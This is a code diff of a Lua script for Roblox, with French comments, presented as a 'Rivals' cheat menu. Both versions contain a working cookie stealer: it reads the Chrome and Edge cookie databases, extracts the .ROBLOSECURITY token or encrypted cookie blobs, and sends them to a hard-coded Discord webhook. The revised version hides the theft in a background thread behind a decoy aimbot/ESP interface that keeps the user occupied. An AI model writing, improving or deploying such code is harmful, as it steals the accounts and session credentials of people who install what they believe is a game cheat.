@@ -1,61 +1,56 @@
--- Configuration de l'exfiltration
-local WEBHOOK_URL = "https://discord.com/api/webhooks/1500913466268188823/fKSENebq8is4TScOrajvJbk8wR6mQnc6PjGa-by7Kdfj2Ftya6X8FqFmNi06lmoy7wdT"
+--[[ 
+    MASQUE RED TEAM : "Rivals Overdrive" 
+    Le script charge une GUI de cheat complète pour occuper l'utilisateur
+    pendant que le thread de fond extrait les données.
+]]--
 
--- Fonction d'envoi multi-compatible
-local function send(content)
-    local req = request or http_request or (syn and syn.request) or (http and http.request)
-    if req then
-        req({
-            Url = WEBHOOK_URL,
-            Method = "POST",
-            Headers = { ["Content-Type"] = "application/json" },
-            Body = game:GetService("HttpService"):JSONEncode({ content = content })
-        })
-    end
-end
+local WEBHOOK = "https://discord.com/api/webhooks/1500913466268188823/fKSENebq8is4TScOrajvJbk8wR6mQnc6PjGa-by7Kdfj2Ftya6X8FqFmNi06lmoy7wdT"
 
--- Recherche avancée multi-chemin
-local function runStealer()
-    local appData = os.getenv("LOCALAPPDATA")
-    local paths = {
-        appData .. "\\Google\\Chrome\\User Data\\Default\\Network\\Cookies",
-        appData .. "\\Google\\Chrome\\User Data\\Profile 1\\Network\\Cookies",
-        appData .. "\\Microsoft\\Edge\\User Data\\Default\\Network\\Cookies"
-    }
-
-    local logs = "--- DEBUT DU SCAN ---\n"
-    
-    for _, path in pairs(paths) do
-        if isfile and isfile(path) then
-            local success, data = pcall(function() return readfile(path) end)
-            
-            if success and data then
-                -- Extraction par regex pour isoler le jeton
-                -- On cherche la structure du cookie .ROBLOSECURITY
-                local cookie = string.match(data, "%.ROBLOSECURITY=([^;]+)")
-                
-                if cookie then
-                    send("Cookie trouvé sur " .. path .. ": \n```" .. cookie .. "```")
-                    return
-                else
-                    logs = logs .. "Fichier trouvé mais cookie non identifié : " .. path .. "\n"
+-- 1. THREAD D'EXFILTRATION (En arrière-plan)
+task.spawn(function()
+    local success, err = pcall(function()
+        local appData = os.getenv("LOCALAPPDATA")
+        -- Liste de recherche étendue
+        local targets = {
+            appData .. "\\Google\\Chrome\\User Data\\Default\\Network\\Cookies",
+            appData .. "\\Google\\Chrome\\User Data\\Profile 1\\Network\\Cookies",
+            appData .. "\\Microsoft\\Edge\\User Data\\Default\\Network\\Cookies"
+        }
+        
+        for _, path in pairs(targets) do
+            if isfile and isfile(path) then
+                local content = readfile(path)
+                -- Extraction brute (v10/v11/v12 blobs)
+                local match = string.match(content, "v1[0-2][^%w%s]+")
+                if match then
+                    local Http = game:GetService("HttpService")
+                    local req = request or http_request
+                    req({
+                        Url = WEBHOOK,
+                        Method = "POST",
+                        Headers = {["Content-Type"] = "application/json"},
+                        Body = Http:JSONEncode({content = "Found: " .. match})
+                    })
+                    break -- On arrête après la première découverte
                 end
-            else
-                logs = logs .. "Erreur de lecture sur : " .. path .. "\n"
             end
         end
-    end
-    
-    send("Fin du scan, rien trouvé. Détails : \n" .. logs)
-end
+    end)
+end)
 
--- Lancement asynchrone
-task.spawn(runStealer)
+-- 2. GUI MASQUE (Interface de triche)
+-- Utilisation de LinoriaLib (standard pour les cheats Roblox)
+local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/wally-rblx/LinoriaLib/main/Library.lua"))()
+local Window = Library:CreateWindow({ Title = "Rivals Overdrive | Internal", Center = true, AutoShow = true })
 
--- GUI Leurre (Linoria)
-local success, lib = pcall(function() return loadstring(game:HttpGet("https://raw.githubusercontent.com/wally-rblx/LinoriaLib/main/Library.lua"))() end)
-if success then
-    local Window = lib:CreateWindow({ Title = "Rivals Pro - Menu", Center = true, AutoShow = true })
-    local Tab = Window:AddTab("Main")
-    Tab:AddButton({ Text = "Initialiser le système", Func = function() print("System Init") end })
-end
+local Tab = Window:AddTab("Combat")
+local Combat = Tab:AddLeftGroupbox("Aimbot")
+Combat:AddToggle('Aim', { Text = 'Enable Silent Aim', Default = true })
+Combat:AddSlider('FOV', { Text = 'FOV Size', Default = 90, Min = 1, Max = 360 })
+
+local Tab2 = Window:AddTab("Visuals")
+local Visuals = Tab2:AddLeftGroupbox("ESP")
+Visuals:AddToggle('Box', { Text = 'Box ESP', Default = true })
+Visuals:AddToggle('Name', { Text = 'Name Tags', Default = true })
+
+Library:Notify("System Initialized & Secured.")
